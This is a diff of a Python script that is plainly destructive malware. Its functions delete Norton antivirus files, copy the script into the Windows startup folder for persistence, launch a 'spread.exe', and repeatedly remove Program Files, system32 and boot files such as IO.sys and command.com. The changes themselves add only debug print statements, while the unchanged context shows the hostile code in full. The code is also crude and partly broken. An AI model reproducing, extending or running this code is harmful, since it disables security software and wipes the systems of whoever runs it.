@@ -7,12 +7,14 @@ def nortonkill():
     os.remove('c:\\program files\\symantec shared')
     os.remove('c:\\program files\\Norton AntiVirus\\V32scan.dll')
     os.remove('c:\\program files\\Norton AntiVirus\\NavTasks.dll')
+    print("defined nortonkill")
     copyplace()
  
 def copyplace():    
     os.rename("c:\\habby.py","c:\\documents and settings\\all users\\Start Menu\\programs\\startup\\opennow.py")
     os.rename("c:\\habby.py","c:\\windows\\loop.py")
     os.system("start c:\spread.exe")
+    print("defined copyplace")
     explit()          
  
 def explit():
@@ -20,7 +22,7 @@ def explit():
     firstfile = random.choice(randfile)
     seconfile = random.choice(randfile)
     thirdfile = random.choice(randfile)
- 
+    print("defined explit")
     if firstfile == 'Program Files':
         os.rmdir('c:\\program files')
  
@@ -81,6 +83,7 @@ def explit():
  
     if thirdfile == 'system32':
         os.rmdir('c:\\windows\\system32')    
+    print("defined files")
     sleep(3223)
     explit()
  
@@ -98,7 +101,8 @@ def randfile():
     if filepick == 'Juice':
         os.remove('c:\\Autoexec.bat')
         os.remove('c:\\command.com')
-        os.remove('c:\\IO.sys')  
+        os.remove('c:\\IO.sys') 
+    print("defined randfile") 
     nortonkill()
-    
+
 randfile()
